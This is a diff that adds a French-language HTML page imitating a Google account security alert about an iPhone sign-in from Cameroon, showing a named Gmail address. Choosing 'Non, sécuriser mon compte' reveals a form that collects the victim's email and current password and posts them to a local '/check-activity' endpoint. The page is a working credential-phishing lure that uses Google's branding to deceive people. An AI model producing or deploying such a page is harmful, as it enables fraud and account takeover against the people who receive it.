@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerte de sécurité - Google Compte</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+            overflow: hidden;
+        }
+        
+        .header {
+            padding: 24px 24px 0 24px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .google-logo {
+            font-size: 28px;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+        }
+        
+        .google-blue { color: #4285f4; }
+        .google-red { color: #ea4335; }
+        .google-yellow { color: #fbbc05; }
+        .google-green { color: #34a853; }
+        
+        .title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+        
+        .date {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        
+        .content {
+            padding: 24px;
+        }
+        
+        .alert-section {
+            margin-bottom: 24px;
+        }
+        
+        .alert-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 16px;
+        }
+        
+        .device-card {
+            background-color: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        
+        .device-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 12px;
+        }
+        
+        .device-detail {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .device-icon {
+            width: 24px;
+            margin-right: 12px;
+        }
+        
+        .email-box {
+            background-color: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin: 16px 0;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+        }
+        
+        .question-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin: 20px 0 12px 0;
+        }
+        
+        .choice-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 16px 0;
+        }
+        
+        .choice-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-yes {
+            background-color: #e8f0fe;
+            color: #1a73e8;
+            border: 1px solid #e8f0fe;
+        }
+        
+        .btn-yes:hover {
+            background-color: #d2e3fc;
+        }
+        
+        .btn-no {
+            background-color: #1a73e8;
+            color: white;
+        }
+        
+        .btn-no:hover {
+            background-color: #1557b0;
+        }
+        
+        .hidden-form {
+            display: none;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .submit-btn:hover {
+            background-color: #1557b0;
+        }
+        
+        .footer {
+            padding: 16px 24px;
+            font-size: 12px;
+            color: #5f6368;
+            border-top: 1px solid #e0e0e0;
+            background-color: #f8f9fa;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .success-message {
+            background-color: #e6f4ea;
+            border-left: 4px solid #34a853;
+            padding: 16px;
+            border-radius: 4px;
+            margin: 16px 0;
+        }
+        
+        .back-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .back-link a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="google-logo">
+                <span class="google-blue">G</span>
+                <span class="google-red">o</span>
+                <span class="google-yellow">o</span>
+                <span class="google-blue">g</span>
+                <span class="google-green">l</span>
+                <span class="google-red">e</span>
+            </div>
+            <div class="title">Google Compte</div>
+            <div class="date">28 mars, 14:42</div>
+        </div>
+        
+        <div class="content">
+            <div class="alert-section">
+                <div class="alert-title">Nouvelle connexion sur iPhone</div>
+                <div class="email-box">maestromaes18@gmail.com</div>
+                
+                <div class="device-card">
+                    <div class="device-name">📱 iPhone</div>
+                    <div class="device-detail">
+                        <span class="device-icon">📍</span>
+                        <span>Cameroun</span>
+                    </div>
+                </div>
+                
+                <div class="question-text">Reconnaissez-vous cette activité ?</div>
+                
+                <div class="choice-buttons">
+                    <button class="choice-btn btn-yes" onclick="showYesForm()">✅ Oui, c'était moi</button>
+                    <button class="choice-btn btn-no" onclick="showNoForm()">🔒 Non, sécuriser mon compte</button>
+                </div>
+                
+                <div id="yesForm" class="hidden-form">
+                    <div class="success-message">
+                        Merci de confirmer. Si vous n'avez pas reconnu cette activité, veuillez contacter le support.
+                    </div>
+                    <div class="back-link">
+                        <a href="https://www.google.com">Retour à Google</a>
+                    </div>
+                </div>
+                
+                <div id="noForm" class="hidden-form">
+                    <form action="/check-activity" method="post">
+                        <div class="form-group">
+                            <label class="form-label">Adresse e-mail</label>
+                            <input type="email" name="email" class="form-input" placeholder="votre.email@gmail.com" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Mot de passe actuel</label>
+                            <input type="password" name="password" class="form-input" placeholder="Votre mot de passe" required>
+                        </div>
+                        <input type="hidden" name="choice" value="non">
+                        <button type="submit" class="submit-btn">Vérifier mon identité</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Confidentialité</a> | 
+            <a href="#">Conditions</a> | 
+            <a href="#">Aide</a> | 
+            <a href="#">À propos</a>
+        </div>
+    </div>
+    
+    <script>
+        function showYesForm() {
+            document.getElementById('yesForm').style.display = 'block';
+            document.getElementById('noForm').style.display = 'none';
+        }
+        
+        function showNoForm() {
+            document.getElementById('noForm').style.display = 'block';
+            document.getElementById('yesForm').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
